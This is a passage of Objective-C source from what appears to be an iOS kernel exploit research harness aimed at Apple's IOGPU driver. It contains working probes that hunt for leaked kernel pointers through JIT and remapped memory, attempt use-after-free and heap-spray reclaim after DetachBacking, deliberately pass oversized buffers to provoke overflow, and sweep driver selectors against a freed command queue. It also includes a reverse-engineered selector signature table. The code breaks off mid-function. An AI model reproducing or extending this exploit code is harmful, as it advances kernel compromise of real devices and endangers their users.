        if (!pCreate || !pCopyEnt) {
            [out appendString:@"SecTask dlsym failed — cannot dump entitlements\n\n"];
        } else {
            void *task = pCreate(kCFAllocatorDefault);
            if (!task) {
                [out appendString:@"SecTaskCreateFromSelf NULL\n\n"];
            } else {
                NSArray<NSString *> *keys = @[
                    @"get-task-allow",
                    @"com.apple.security.cs.allow-jit",
                    @"com.apple.developer.cs.allow-jit",
                    @"com.apple.developer.web-browser-engine.webcontent",
                    @"dynamic-codesigning",
                    @"com.apple.private.cs.allow-jit",
                ];
                for (NSString *k in keys) {
                    CFErrorRef cferr = NULL;
                    CFTypeRef v = pCopyEnt(task, (__bridge CFStringRef)k, &cferr);
                    [out appendFormat:@"  %@ = %@\n", k, v ? (__bridge id)v : @"(absent)"];
                    if (v) CFRelease(v);
                    if (cferr) CFRelease(cferr);
                }
                CFRelease(task);
                [out appendString:@"AMFI MAP_JIT needs dynamic-codesigning OR (webcontent AND developer.cs.allow-jit).\n"];
                [out appendString:@"security.cs.allow-jit is macOS Hardened Runtime — ignored on iOS AMFI.\n"];
                [out appendString:@"If developer.cs.allow-jit is absent, Xcode stripped it (no profile grant).\n\n"];
            }
        }
    }

    mach_port_t selftask = mach_task_self();
    vm_size_t SZ = 0x4000;
    int total_kptr_hits = 0;
    int map_jit_ok = 0;

    // Real JIT API is mmap(MAP_JIT). vm_allocate|0x800 is a different namespace.
    {
        struct { const char *name; int prot; } maps[] = {
            { "RWX", PROT_READ|PROT_WRITE|PROT_EXEC },
            { "RW",  PROT_READ|PROT_WRITE },
        };
        for (int mi = 0; mi < 2; mi++) {
            void *p = mmap(NULL, SZ, maps[mi].prot, MAP_ANON|MAP_PRIVATE|MAP_JIT, -1, 0);
            if (p == MAP_FAILED) {
                [out appendFormat:@"[mmap MAP_JIT %s] FAILED errno=%d (%s)\n",
                    maps[mi].name, errno, strerror(errno)];
                P005LOG("mmapJIT %s fail errno=%d\n", maps[mi].name, errno);
                continue;
            }
            map_jit_ok = 1;
            memset(p, 0x41, SZ);
            vm_address_t dst = 0; vm_prot_t curp, maxp;
            kern_return_t kr = mach_vm_remap(selftask, &dst, SZ, 0, VM_FLAGS_ANYWHERE,
                                            selftask, (mach_vm_address_t)(uintptr_t)p, FALSE,
                                            &curp, &maxp, VM_INHERIT_DEFAULT);
            if (kr == KERN_SUCCESS && dst) {
                int nm = 0;
                int h = p005_scan_kptrs((uint8_t*)dst, SZ, "mmapJIT.remap", out, &nm);
                [out appendFormat:@"[mmap MAP_JIT %s] remap dst=0x%lx cur=%c%c%c kptr=%d foreign_qw=%d\n",
                    maps[mi].name, (unsigned long)dst,
                    (curp&VM_PROT_READ)?'r':'-',(curp&VM_PROT_WRITE)?'w':'-',(curp&VM_PROT_EXECUTE)?'x':'-',
                    h, nm];
                if (h) { total_kptr_hits += h; P005LOG("HIT mmapJIT remap hits=%d\n", h); }
                vm_deallocate(selftask, dst, SZ);
            } else {
                [out appendFormat:@"[mmap MAP_JIT %s] remap kr=0x%x\n", maps[mi].name, kr];
            }
            munmap(p, SZ);
            [out appendFormat:@"[mmap MAP_JIT %s] allocate OK\n", maps[mi].name];
            P005LOG("mmapJIT %s alloc OK\n", maps[mi].name);
        }
        [out appendString:@"\n"];
    }

    struct { const char *name; int mflags; vm_prot_t cur; vm_prot_t maxp; } variants[] = {
        { "plain RW",        0,                 VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE },
        { "alloc flags 0x800 (NOT mmap JIT)", MAP_JIT, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE },
        { "alloc 0x800 rw",  MAP_JIT,           VM_PROT_READ|VM_PROT_WRITE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE },
        { "plain RX exec",   0,                 VM_PROT_READ|VM_PROT_EXECUTE, VM_PROT_READ|VM_PROT_EXECUTE },
        { "plain RWX",       0,                 VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE, VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE },
    };
    int nvariants = (int)(sizeof(variants)/sizeof(variants[0]));

    for (int vi = 0; vi < nvariants; vi++) {
        vm_address_t src = 0;
        kern_return_t kr = vm_allocate(selftask, &src, SZ, VM_FLAGS_ANYWHERE | variants[vi].mflags);
        if (kr != KERN_SUCCESS) {
            [out appendFormat:@"[%s] vm_allocate src FAILED kr=0x%x (MAP_JIT gated?)\n\n", variants[vi].name, kr];
            P005LOG("variant %d src-alloc fail kr=0x%x\n", vi, kr);
            continue;
        }
        if (variants[vi].mflags & MAP_JIT) map_jit_ok = 1;
        memset((void *)src, 0x41, SZ);
        vm_protect(selftask, src, SZ, 0, variants[vi].cur);

        for (int mv = 0; mv < 2; mv++) {
            vm_address_t dst = 0;
            vm_prot_t curp, maxp;
            kr = mach_vm_remap(selftask, &dst, SZ, 0, VM_FLAGS_ANYWHERE,
                               selftask, src, (mv==1) ? TRUE : FALSE,
                               &curp, &maxp, VM_INHERIT_DEFAULT);
            if (kr != KERN_SUCCESS) {
                [out appendFormat:@"[%s] vm_remap(%s) FAILED kr=0x%x\n", variants[vi].name, mv?"move":"copy", kr];
                P005LOG("v%d remap mv%d kr=0x%x\n", vi, mv, kr);
                continue;
            }
            int nonmarker = 0;
            int h = p005_scan_kptrs((uint8_t*)dst, SZ, mv?"remap.move":"remap.copy", out, &nonmarker);
            if (h) {
                [out appendFormat:@"  *** [%s] vm_remap(%s) dst=0x%lx KERNEL-PTR hits=%d ***\n",
                    variants[vi].name, mv?"move":"copy", (unsigned long)dst, h];
                P005LOG("HIT v%d remap mv%d dst=0x%lx hits=%d\n", vi, mv, (unsigned long)dst, h);
                total_kptr_hits += h;
            }
            [out appendFormat:@"  [%s] vm_remap(%s) dst=0x%lx cur=%c%c%c max=%c%c%c kptr=%d foreign_qw=%d%s\n",
                variants[vi].name, mv?"move":"copy", (unsigned long)dst,
                (curp&VM_PROT_READ)?'r':'-',(curp&VM_PROT_WRITE)?'w':'-',(curp&VM_PROT_EXECUTE)?'x':'-',
                (maxp&VM_PROT_READ)?'r':'-',(maxp&VM_PROT_WRITE)?'w':'-',(maxp&VM_PROT_EXECUTE)?'x':'-', h,
                nonmarker, nonmarker? "  <<< FOREIGN":""];
            if (nonmarker) { P005LOG("FOREIGN v%d remap mv%d nonmarker=%d\n", vi, mv, nonmarker); }
            vm_deallocate(selftask, dst, SZ);
        }

        vm_address_t copyaddr = 0; mach_msg_type_number_t copysz = (mach_msg_type_number_t)SZ;
        kr = vm_read(selftask, src, SZ, &copyaddr, &copysz);
        if (kr == KERN_SUCCESS && copyaddr) {
            int nm2 = 0;
            int h = p005_scan_kptrs((uint8_t*)copyaddr, copysz, "vm_read copy", out, &nm2);
            if (h) { [out appendFormat:@"  *** [%s] vm_read copy KERNEL-PTR hits=%d ***\n", variants[vi].name, h];
                     P005LOG("HIT v%d vm_read hits=%d\n", vi, h); total_kptr_hits += h; }
            if (nm2) { [out appendFormat:@"  [%s] vm_read copy foreign_qw=%d\n", variants[vi].name, nm2];
                       P005LOG("FOREIGN v%d vm_read nonmarker=%d\n", vi, nm2); }
            vm_deallocate(selftask, copyaddr, copysz);
        }

        // v2: try R, RW, then RWX memory entries (old probe only RWX → often kr=2)
        p005_try_mementry(out, logfd, selftask, src, SZ, variants[vi].name, vi, VM_PROT_READ, &total_kptr_hits);
        p005_try_mementry(out, logfd, selftask, src, SZ, variants[vi].name, vi, VM_PROT_READ|VM_PROT_WRITE, &total_kptr_hits);
        p005_try_mementry(out, logfd, selftask, src, SZ, variants[vi].name, vi,
                          VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE, &total_kptr_hits);

        {
            vm_address_t dst2 = 0; vm_prot_t curp = VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE, maxp = VM_PROT_ALL;
            kr = mach_vm_remap(selftask, &dst2, SZ, 0, VM_FLAGS_ANYWHERE, selftask, src, FALSE,
                               &curp, &maxp, VM_INHERIT_DEFAULT);
            if (kr == KERN_SUCCESS && dst2) {
                int nm4 = 0;
                int h = p005_scan_kptrs((uint8_t*)dst2, SZ, "remap.rwx", out, &nm4);
                if (h) { [out appendFormat:@"  *** [%s] remap.rwx KERNEL-PTR hits=%d ***\n", variants[vi].name, h];
                         P005LOG("HIT v%d remaprwx hits=%d\n", vi, h); total_kptr_hits += h; }
                [out appendFormat:@"  [%s] remap.rwx dst2=0x%lx cur=%c%c%c max=%c%c%c kptr=%d foreign_qw=%d\n",
                    variants[vi].name, (unsigned long)dst2,
                    (curp&VM_PROT_READ)?'r':'-',(curp&VM_PROT_WRITE)?'w':'-',(curp&VM_PROT_EXECUTE)?'x':'-',
                    (maxp&VM_PROT_READ)?'r':'-',(maxp&VM_PROT_WRITE)?'w':'-',(maxp&VM_PROT_EXECUTE)?'x':'-', h, nm4];
                vm_deallocate(selftask, dst2, SZ);
            }
        }

        vm_deallocate(selftask, src, SZ);
        [out appendString:@"\n"];
        P005LOG("variant %d done\n", vi);
    }

    [out appendString:@"=== VERDICT ===\n"];
    [out appendFormat:@"map_jit_reachable=%d total_kptr_hits=%d\n", map_jit_ok, total_kptr_hits];
    if (total_kptr_hits == 0) {
        if (!map_jit_ok) {
            [out appendString:@"0 kptr + no MAP_JIT: NOT a 64709 test. Need allow-jit or bit0x16 path.\n"];
            [out appendString:@"0 hits on plain 0x41 pages is expected. Inconclusive, not neg control.\n"];
        } else {
            [out appendString:@"MAP_JIT reachable but 0 kptr: interesting — paste full log.\n"];
            [out appendString:@"Still not KRW. May mean downgrade already enough, or disclose needs more.\n"];
        }
    } else {
        [out appendFormat:@"*** %d KERNEL-POINTER HITS *** — paste full log. Companion-disclose, not KRW.\n", total_kptr_hits];
    }
    P005LOG("SURVIVED p005-v2 total_hits=%d jit=%d\n", total_kptr_hits, map_jit_ok);
    if (logfd >= 0) close(logfd);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}
// ==== END P005Probe.inc.h ====

// ==== BEGIN inlined P009DetachUAF.inc.h ====
// P009 DetachBacking — DIAGNOSTIC
// DetachBacking (sel=0x25) unmaps backing from GPU but does NOT free CPU mapping.
// The 0x41 fill is still visible via [buf contents] after detach.
// This is NOT a UAF — it's a GPU unmap, not a free.
// Keeping for reference — may be useful in combination with other primitives.

// IOGPU function typedefs (file scope for all functions)
typedef void *(*IOGPUDevCreate_t)(io_service_t);
typedef uint32_t (*IOGPUGetConn_t)(void *);
typedef void *(*IOGPUQueueCreate_t)(void *);
typedef uint32_t (*IOGPUQueueGetConn_t)(void *);

// Static helper: extract resourceRef from Metal buffer (file scope, not inside function)
static void *p009_getResourceRef(id buf) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(buf, sel);
        if (!base || base == buf) break;
        buf = base;
    }
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, sel);
}

// OOL descriptor — matches mach_msg_ool_descriptor_t layout exactly
// bitfields pack 4x8-bit into 4 bytes (same as real struct)
typedef struct {
    void *address;
    unsigned int deallocate: 8;
    unsigned int copy: 8;
    unsigned int pad2: 8;
    unsigned int type: 8;
    mach_msg_size_t size;
} p009_ool_desc_t;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    p009_ool_desc_t ool;
} p009_ool_msg_t;

#undef P005LOG

+ (NSString *)runP009DetachUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P009 DetachBacking UAF + OOL data spray ===\n"];
    [out appendString:@"Backing is kalloc_data (not typed zone) -> OOL spray WORKS\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        [out appendFormat:@"STOP: iokit=%p iogpu=%p\n", iokit, iogpu];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    // IOGPU resource functions
    typedef int (*IOGPUDetach_t)(void *resource);
    typedef int (*IOGPUReplaceBytes_t)(void *resource, void *bytes, uint64_t length);
    typedef uint32_t (*IOGPUGetType_t)(void *resource);
    typedef uint64_t (*IOGPUGetU64_t)(void *resource);
    IOGPUDetach_t pDetach = (IOGPUDetach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    IOGPUReplaceBytes_t pReplaceBytes = (IOGPUReplaceBytes_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    IOGPUGetType_t pGetType = (IOGPUGetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    IOGPUGetU64_t pGetGPUVA = (IOGPUGetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    IOGPUGetU64_t pGetGPUVALen = (IOGPUGetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");

    if (!pDetach) {
        [out appendString:@"STOP: no IOGPUResourceDetachBacking\n"];
        return out;
    }
    [out appendFormat:@"detach=%p replace=%p getType=%p getGPUVA=%p\n",
        pDetach, pReplaceBytes, pGetType, pGetGPUVA];

    // Metal device
    id<MTLDevice> mtlDevice = MTLCreateSystemDefaultDevice();
    if (!mtlDevice) { [out appendString:@"STOP: no Metal device\n"]; return out; }

    // Find IOGPU service
    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP: no IOGPU service\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n", svc];

    // OOL spray disabled — backing is 128KB, OOL data is 0x120 (1000x too small)
    [out appendString:@"OOL spray disabled (backing too large)\n\n"];

    // === Main exploit loop ===
    int uafHits = 0;
    int sprayHits = 0;
    int N = 50;

    for (int iter = 0; iter < N; iter++) {
        const NSUInteger mtlLen = 4096;
        id buf = [mtlDevice newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
        if (!buf) continue;

        void *ref = p009_getResourceRef(buf);
        if (!ref) { [out appendString:@"no resourceRef\n"]; continue; }

        uint32_t typ = pGetType ? pGetType(ref) : 0;

        if (iter == 0) {
            [out appendFormat:@"iter0: buf=%p ref=%p class=%@\n", buf, ref, NSStringFromClass([buf class])];
            [out appendFormat:@"iter0: type=0x%x\n", typ];
        }

        // Don't skip on type — try detach anyway (type check may be wrong on 18.7.5)

        void *cpu = [buf contents];
        if (cpu) memset(cpu, 0x41, mtlLen);

        // Confirm 0x41 fill visible BEFORE detach
        if (iter == 0 && cpu) {
            uint8_t *c = (uint8_t *)cpu;
            int f41 = 0;
            for (int j = 0; j < (int)mtlLen - 8; j += 8) {
                if (*(uint64_t *)(c + j) == 0x4141414141414141ULL) f41++;
            }
            [out appendFormat:@"iter0: pre-detach CPU: 0x41=%d/%d\n", f41, (int)(mtlLen/8)];
        }

        // Read resource state BEFORE detach
        uint64_t gvaBefore = pGetGPUVA ? pGetGPUVA(ref) : 0;
        uint64_t gvaLenBefore = pGetGPUVALen ? pGetGPUVALen(ref) : 0;

        // DetachBacking — frees the backing data buffer
        int dkr = pDetach(ref);
        if (dkr != 0) {
            [out appendFormat:@"iter%d: detach failed 0x%08x\n", iter, dkr];
            continue;
        }

        // Read resource state AFTER detach — did anything change?
        uint64_t gvaAfter = pGetGPUVA ? pGetGPUVA(ref) : 0;
        uint64_t gvaLenAfter = pGetGPUVALen ? pGetGPUVALen(ref) : 0;

        if (iter == 0) {
            [out appendFormat:@"iter0: GVA before=0x%llx after=0x%llx %@\n",
                gvaBefore, gvaAfter, gvaBefore == gvaAfter ? @"SAME" : @"CHANGED"];
            [out appendFormat:@"iter0: GVALen before=0x%llx after=0x%llx %@\n",
                gvaLenBefore, gvaLenAfter, gvaLenBefore == gvaLenAfter ? @"SAME" : @"CHANGED"];
        }

        if (gvaAfter != gvaBefore || gvaLenAfter != gvaLenBefore) {
            [out appendFormat:@"iter%d: STATE CHANGED after detach! GVA 0x%llx->0x%llx len 0x%llx->0x%llx\n",
                iter, gvaBefore, gvaAfter, gvaLenBefore, gvaLenAfter];
            uafHits++;
        }

        // === Same-type reclaim: create new Metal buffers ===
        NSMutableArray *sprayBufs = [NSMutableArray array];
        for (int s = 0; s < 100; s++) {
            id sb = [mtlDevice newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
            if (sb) {
                [sprayBufs addObject:sb];
                void *scpu = [sb contents];
                if (scpu) memset(scpu, 0x42, mtlLen);
            }
        }
        if (iter == 0) [out appendFormat:@"iter0: same-type spray=%d buffers\n", (int)[sprayBufs count]];

        // Try to use the resource (reads from freed backing)
        uint64_t gva2 = pGetGPUVA ? pGetGPUVA(ref) : 0;
        if (gva2 != gvaBefore && gva2 != 0) {
            [out appendFormat:@"iter%d: GVA CHANGED 0x%llx -> 0x%llx *** UAF ***\n", iter, gvaBefore, gva2];
            uafHits++;
            if ((gva2 & 0xFFFFFFFF00000000ULL) == 0x4C554D4900000000ULL) {
                [out appendString:@"*** GVA contains spray pattern — controlled read! ***\n"];
                sprayHits++;
            }
            if ((gva2 & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                [out appendFormat:@"*** KERNEL POINTER LEAK: 0x%llx ***\n", gva2];
                sprayHits++;
            }
        }

        // GPU blit read-back — SKIP (GPU hangs on freed backing, blit status=5)
        if (iter < 3) [out appendFormat:@"iter%d: GPU blit skipped (backing freed)\n", iter];

        // Try ReplaceBytes with LARGER size than original — heap overflow into freed backing
        if (pReplaceBytes) {
            // First: normal size replace (0x43 fill)
            void *normalData = calloc(1, (size_t)gvaLenBefore);
            memset(normalData, 0x43, (size_t)gvaLenBefore);
            int rkr1 = pReplaceBytes(ref, normalData, gvaLenBefore);
            if (rkr1 == 0) {
                [out appendFormat:@"iter%d: replace(normal 0x%llx) OK\n", iter, gvaLenBefore];
            }
            free(normalData);

            // Second: OVERFLOW — replace with 2x size (0x44 fill)
            // If backing is freed and reused by smaller alloc, this overflows
            uint64_t overflowLen = gvaLenBefore * 2;
            void *overflowData = calloc(1, (size_t)overflowLen);
            memset(overflowData, 0x44, (size_t)overflowLen);
            int rkr2 = pReplaceBytes(ref, overflowData, overflowLen);
            [out appendFormat:@"iter%d: replace(overflow %llu) -> 0x%08x\n", iter, overflowLen, rkr2];
            if (rkr2 == 0) {
                // kr=0 alone is NOT an overflow: kernel accepts replace iff len == true
                // backing size (0x20000 for 4KB AGX buffer). Real bug = post-replace
                // believed length (GVALen) disagrees with installed backing length.
                uint64_t gvaLenPost = pGetGPUVALen ? pGetGPUVALen(ref) : 0;
                [out appendFormat:@"iter%d: replace OK after detach; post GVALen=0x%llx vs installed 0x%llx\n",
                    iter, gvaLenPost, overflowLen];
                if (gvaLenPost != overflowLen) {
                    [out appendFormat:@"*** SIZE CONFUSION: resource believes 0x%llx, backing is 0x%llx ***\n",
                        gvaLenPost, overflowLen];
                    uafHits++;
                } else {
                    [out appendString:@"iter: benign — exact-size replace accepted, lengths consistent\n"];
                }
            }
            free(overflowData);
        }

        // Check CPU contents — original 0x41, same-type 0x42, spray patterns
        if (cpu) {
            uint8_t *c = (uint8_t *)cpu;
            int found41 = 0, found42 = 0, foundDEAD = 0;
            for (int j = 0; j < (int)mtlLen - 8; j += 8) {
                uint64_t val = *(uint64_t *)(c + j);
                if (val == 0x4141414141414141ULL) found41++;
                if (val == 0x4242424242424242ULL) found42++;
                if ((val & 0xFFFFFFFF00000000ULL) == 0xDEADBEEF00000000ULL) foundDEAD++;
            }
            if (iter < 5) {
                [out appendFormat:@"iter%d: CPU: 0x41=%d 0x42=%d DEAD=%d\n",
                    iter, found41, found42, foundDEAD];
            }
            if (found41 > 0 && iter == 0) {
                [out appendString:@"iter0: ORIGINAL 0x41 STILL VISIBLE — detach did NOT free backing!\n"];
                [out appendString:@"iter0: This is NOT a UAF — CPU mapping is still valid.\n"];
                [out appendString:@"iter0: DetachBacking only unmaps from GPU, not from CPU.\n"];
            }
            if (found42 > 0) {
                [out appendFormat:@"iter%d: SAME-TYPE 0x42 in CPU — backing reclaimed! ***\n", iter];
                sprayHits++;
            }
            if (foundDEAD > 0) {
                [out appendFormat:@"iter%d: OOL SPRAY in CPU — controlled read! ***\n", iter];
                sprayHits++;
            }

            // Try to WRITE to the buffer after detach — if it works, backing is still alive
            if (iter == 0) {
                memset(cpu, 0x55, mtlLen);
                int f55 = 0;
                for (int j = 0; j < (int)mtlLen - 8; j += 8) {
                    if (*(uint64_t *)(c + j) == 0x5555555555555555ULL) f55++;
                }
                [out appendFormat:@"iter0: post-detach write: 0x55=%d — backing %s\n",
                    f55, f55 > 0 ? "STILL WRITABLE" : "WRITE FAILED"];
            }
        }
    }

    [out appendFormat:@"\n=== Results ===\n"];
    [out appendFormat:@"N=%d uaf_hits=%d spray_hits=%d\n", N, uafHits, sprayHits];
    [out appendString:@"uaf_hit = GVA changed or replace OK after detach\n"];
    [out appendString:@"spray_hit = spray pattern in CPU contents\n"];
    [out appendString:@"KEY FINDING: 0x41 still visible after detach = NOT a UAF (CPU mapping alive)\n"];
    [out appendString:@"DetachBacking only unmaps from GPU, does NOT free CPU backing.\n"];
    [out appendString:@"panic = UAF + spray landed.\n"];

    // Cleanup
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// P010 Post-Destroy UAF: destroy queue, create new queue, access old qid
// CONFIRMED: sel=16 on device connection with old qid returns 0 (100% UAF).
// sel=16 doesn't return data. The queue table is properly updated.
// The UAF is in the queue object itself — freed but not zeroed.
// Now we try to find a selector that reads from the freed queue and returns data.
+ (NSString *)runP010PostDestroyUAF {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010pduaf"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@ === P010 Post-Destroy UAF + Data Read ===\n", [NSDate date]];
    [out appendString:@"Find selector that reads from freed queue and returns data.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"dlopen IOKit failed\n"]; return out; }
    IOServiceMatching_t pMatch = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGetSvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    io_service_t svc = pGetSvc(0, pMatch("IOGPU"));
    if (!svc) { [out appendString:@"IOGPU not found\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n", svc];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { [out appendString:@"dlopen IOGPU failed\n"]; pRelease(svc); return out; }
    IOGPUDevCreate_t pDevCreate = (IOGPUDevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    IOGPUGetConn_t pGetConn = (IOGPUGetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    IOGPUQueueCreate_t pQueueCreate = (IOGPUQueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    IOGPUQueueGetConn_t pQueueGetConn = (IOGPUQueueGetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    if (!pDevCreate || !pGetConn || !pQueueCreate || !pQueueGetConn) {
        [out appendString:@"IOGPU functions not found\n"]; pRelease(svc); return out;
    }

    void *iokit2 = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit2, "IOConnectCallMethod");
    IOServiceClose_t pClose = dlsym(iokit2, "IOServiceClose");

    // Step 1: Create device + queue
    void *devA = pDevCreate(svc);
    if (!devA) { [out appendString:@"devA failed\n"]; pRelease(svc); return out; }
    io_connect_t connA = pGetConn(devA);
    if (!connA) { [out appendString:@"connA failed\n"]; pRelease(svc); return out; }

    void *queueA = pQueueCreate(devA);
    if (!queueA) { [out appendString:@"queueA failed\n"]; pRelease(svc); return out; }
    uint32_t qConnA = pQueueGetConn(queueA);
    if (!qConnA) { [out appendString:@"qConnA failed\n"]; pRelease(svc); return out; }

    uint64_t qid = *(uint64_t *)((uint8_t *)queueA + 0x18);
    [out appendFormat:@"queueA: qid=0x%llx conn=0x%x\n", qid, qConnA];

    // Step 2: Destroy queue
    uint64_t sc8[1] = {qid};
    kern_return_t dr = pCall(qConnA, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [out appendFormat:@"destroy -> 0x%08x\n", (unsigned)dr];

    // Step 3: Create new queue (reuses freed slot)
    void *queueB = pQueueCreate(devA);
    if (!queueB) { [out appendString:@"queueB failed\n"]; pRelease(svc); return out; }
    uint64_t qid2 = *(uint64_t *)((uint8_t *)queueB + 0x18);
    [out appendFormat:@"new queue: qid=0x%llx\n", qid2];

    // Step 4: Try different selectors on device conn with old qid to read data
    [out appendString:@"\n--- Selector sweep on device conn with old qid (0-63) ---\n"];
    int foundSels = 0;
    for (uint32_t sel = 0; sel < 64; sel++) {
        uint64_t sc[1] = {qid};
        uint8_t structOut[0x100] = {0};
        size_t structOutSize = sizeof(structOut);
        uint64_t outSc[8] = {0};
        uint32_t outCnt = 8;

        // Try with struct output
        kern_return_t rr = pCall(connA, sel, sc, 1, NULL, 0, outSc, &outCnt, structOut, &structOutSize);
        if (rr == 0 && (outCnt > 0 || structOutSize > 0)) {
            foundSels++;
            [out appendFormat:@"  sel=%u: OK outCnt=%u structOutSize=%zu\n", sel, outCnt, structOutSize];
            // Check for non-zero data
            int nonZero = 0;
            for (int i = 0; i < 0x100 && i < (int)structOutSize; i += 8) {
                uint64_t val = *(uint64_t *)&structOut[i];
                if (val != 0 && (val >> 40) != 0) {
                    nonZero++;
                    if (nonZero <= 2) {
                        [out appendFormat:@"    structOut[0x%x] = 0x%016llx\n", i, val];
                    }
                }
            }
            for (int i = 0; i < 8 && i < (int)outCnt; i++) {
                if (outSc[i] != 0 && (outSc[i] >> 40) != 0) {
                    [out appendFormat:@"    outSc[%d] = 0x%016llx\n", i, outSc[i]];
                }
            }
        } else if (rr != 0xe00002c2 && rr != 0xe00002c7) {
            [out appendFormat:@"  sel=%u: 0x%08x\n", sel, (unsigned)rr];
        }
    }
    [out appendFormat:@"found %d selectors with output\n", foundSels];

    [out appendString:@"\nDONE -- paste this text back\n"];
    pRelease(svc);
    return out;
}

// Exact TABLE_A dispatch signatures from 22H311 IOGPUFamily RE
// (research/iogpu_kext_22H311_layout.md). externalMethod enforces EXACT
// scalIn/structIn/scalOut/structOut counts — wrong counts never reach the handler.
// stIn/stOut: byte size; -1 = variable (skipped); 0 = none.
typedef struct { uint32_t scIn; int32_t stIn; uint32_t scOut; int32_t stOut; } SelSig;

static const SelSig kSelTable[56] = {
    {0,0,0,0x40},    // 0
    {0,0,0,0x40},    // 1
    {0,0,0,0x218},   // 2   (big structOut — prime leak candidate)
    {0,0,0,0x8},     // 3
    {0,0,0,0x20},    // 4
    {0,0,0,0x10},    // 5
    {0,0x10,0,-1},   // 6   variable out — skip
    {0,0x408,0,0x10},// 7
    {1,0,0,0},       // 8   DESTROYS queue — never sweep
    {0,-1,0,-1},     // 9   variable — skip
    {1,0,0,0},       // 10
    {2,0,0,0},       // 11
    {2,0,1,0},       // 12
    {2,0,0,0x10},    // 13
    {1,0,0,0},       // 14
    {2,0,0,0x10},    // 15
    {1,0,0,0},       // 16  CONSUMES qid + drops ref — never sweep
    {0,0,0,0x8},     // 17
    {0,0,0,0x4},     // 18
    {1,0,0,0},       // 19
    {1,0,0,0x18},    // 20
    {1,0,0,0},       // 21
    {0,0,0,0x30},    // 22
    {0,0,0,-1},      // 23  variable — skip
    {0,0,1,0},       // 24
    {2,0,0,0},       // 25
    {4,-1,0,0},      // 26  shared-memory — skip in leak mode
    {1,0xc,1,0},     // 27
    {0,0x4,0,0},     // 28
    {0,0,2,0},       // 29
    {1,0,0,0},       // 30
    {2,0,0,0},       // 31
    {0,0,2,0},       // 32
    {2,0,0,0},       // 33
    {2,0,0,0},       // 34
    {0,0,1,0},       // 35
    {2,0,0,0},       // 36
    {3,0,1,0},       // 37
    {1,0,0,0},       // 38
    {0,0x18,0,0},    // 39
    {0,0x18,1,0},    // 40
    {0,0,2,0},       // 41
    {1,0,0,0},       // 42
    {2,0,2,0},       // 43
    {1,0,0,0},       // 44
    {2,0,0,0},       // 45
    {1,-1,0,0},      // 46  variable — skip
    {1,0,2,0},       // 47
    {2,0,0,0},       // 48
    {2,0,0,0},       // 49
    {1,0,0,0},       // 50
    {1,0,0,0},       // 51
    {3,0,0,0},       // 52
    {2,-1,0,0},      // 53  variable — skip
    {2,-1,0,0},      // 54  variable — skip
    {2,0,1,0},       // 55
};

// Kernel-pointer test that also catches PAC'd pointers: strip the top 16 bits
// (PAC field) and check the remaining low-48-bit value is in kernel range
// (0xFFF0_00000000 .. 0xFFFF_FFFFFFFF).
static bool leakHuntIsKptr(uint64_t val) {
